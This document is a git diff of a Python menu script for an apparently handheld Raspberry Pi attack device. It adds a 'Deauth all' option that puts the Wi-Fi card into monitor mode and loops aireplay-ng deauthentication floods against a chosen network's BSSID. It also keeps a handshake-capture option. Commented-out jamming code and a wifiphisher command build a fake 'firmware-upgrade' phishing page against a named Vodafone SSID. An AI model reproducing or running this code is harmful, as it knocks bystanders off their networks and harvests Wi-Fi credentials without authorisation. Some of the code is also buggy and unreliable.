@@ -104,7 +104,7 @@ while True:
                     selected_option = menu_options[selected_index]
 
                     if selected_option == "Wifi":
-                        menu_options = ["Wifiphisher", "Handshakes"]
+                        menu_options = ["Pwnagotchi", "Wifiphisher", "Handshakes", "Deauth all"]
                         selected_index = 0
 
                         #WIFI
@@ -126,22 +126,21 @@ while True:
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
-                                if selected_option == "Handshakes":
-                                    
-                                        wifi_info().main()
-                                        menu_options = []
-                                        selected_index = 0
+                                if selected_option == "Handshakes":    
+                                    wifi_info().main()
+                                    menu_options = []
+                                    selected_index = 0
 
-                                        with open("wifiinfo.json", mode="r") as a: 
-                                            data = json.load(a)
+                                    with open("wifiinfo.json", mode="r") as a: 
+                                        data = json.load(a)
 
-                                        dictdionary = {}
+                                    dictdionary = {}
 
-                                        for item in data:
+                                    for item in data:
                                             menu_options.append(item['ssid'])                
                                             dictdionary[item['ssid']] = item['bssid']
                                         
-                                        while True:
+                                    while True:
                                             draw_menu(selected_index)
                                             if GPIO.input(KEY_UP_PIN) == 0:
                                                 selected_index = (selected_index - 1) % len(menu_options)
@@ -222,8 +221,101 @@ while True:
                                                     show_message("Handshake captured!",1)
                                                     show_message("retring...")
                                                     break
-                                            #break
+                                        #break
+                                
+                                elif selected_option == "Deauth all":
+                                    wifi_info().main()
+                                    menu_options = []
+                                    selected_index = 0
 
+                                    with open("wifiinfo.json", mode="r") as a: 
+                                        data = json.load(a)
+
+                                    dictdionary = {}
+
+                                    for item in data:
+                                            menu_options.append(item['ssid'])                
+                                            dictdionary[item['ssid']] = item['bssid']
+                                            dictdionary[item['bssid']] = item['chan']
+                                    print(dictdionary)
+                                    print(dictdionary['Vodafone-34821617'])
+                                        
+                                    while True:
+                                            draw_menu(selected_index)
+                                            if GPIO.input(KEY_UP_PIN) == 0:
+                                                selected_index = (selected_index - 1) % len(menu_options)
+                                                draw_menu(selected_index)
+                                                time.sleep(0.3)
+
+                                            elif GPIO.input(KEY_DOWN_PIN) == 0:
+                                                selected_index = (selected_index + 1) % len(menu_options)
+                                                draw_menu(selected_index)
+                                                time.sleep(0.3)
+
+                                            elif GPIO.input(KEY_PRESS_PIN) == 0:
+                                                selected_option = menu_options[selected_index]
+                                                selected_bssid = dictdionary[selected_option]
+                                                selected_chan = dictdionary[selected_bssid]
+                                                print("info: "+selected_option+" "+selected_bssid+" "+str(selected_chan))
+
+
+                                                show_message("Deauth starting...")
+
+                                                os.system("sudo iw wlan0 interface add mon0 type monitor")
+                                                os.system("sudo airmon-ng start mon0")
+                                                os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
+
+                                                show_message("mon0 interface created", 1)
+                                                os.system("sudo iwconfig wlan0 mode monitor")
+
+                                                show_message("Wait please...", 1)
+                                                time.sleep(2)
+                                                
+                                                #os.system(f"sudo iwconfig mon0 channel {str(selected_chan)}")
+                                                show_message(f"mon0 --> channel {selected_chan}")
+
+                                                times = '0'
+                                                
+                                                if times == '0':
+                                                    while True:
+                                                        deauthall = subprocess.run(['sudo', 'aireplay-ng', '--deauth', times, '-a', selected_bssid, 'mon0'], text=True, capture_output=True)
+                                                        #os.system(f"sudo airplay-ng --deauth 0 -a {selected_bssid} mon0")
+                                                        show_message("Deauth full started")
+                                                        with open("output1.txt", 'a') as file:
+                                                            file.write(deauthall.stdout)
+                                                            file.write(deauthall)
+                                                else:
+                                                    for i in range(0, times):
+                                                        deauthall = subprocess.run(['sudo', 'aireplay-ng', '--deauth', times, '-a', selected_bssid, 'mon0'], text=True, capture_output=True)
+                                                        show_message("Deauth full started")
+                                                    show_message("DEAUTH COMPLETE!",2)
+                                                    break
+
+
+
+
+
+
+
+                            """elif selected_option == 'Jam':
+                                    show_message("Wait please...")
+                                                #os.system("sudo airmon-ng moncheck kill")
+                                                #time.sleep(1)
+                                    os.system("sudo iw wlan0 interface add mon0 type monitor")
+                                    os.system("sudo airmon-ng start mon0")
+                                    os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
+
+                                    show_message("waiting 5s ...")
+                                    time.sleep(5)
+                                    show_message("JAMMING STARTED",5)
+                                    for i in range(0, 5000):
+                                        os.system("aireplay-ng -a ")
+                                    
+                                    with open("wifip_output.txt" , 'a') as file:
+                                        file.write(wifiphisher.stdout)
+                                        show_message(wifiphisher.stdout)"""
+
+                                    #os.system('sudo wifiphisher -i mon0 -p firmware-upgrade -e "Vodafone-34821617"')
         elif selected_option == "Bluetooth":
             # Draw and handle the Network sub-menu
             menu_options = ["Dos", "Multiple attacks"]
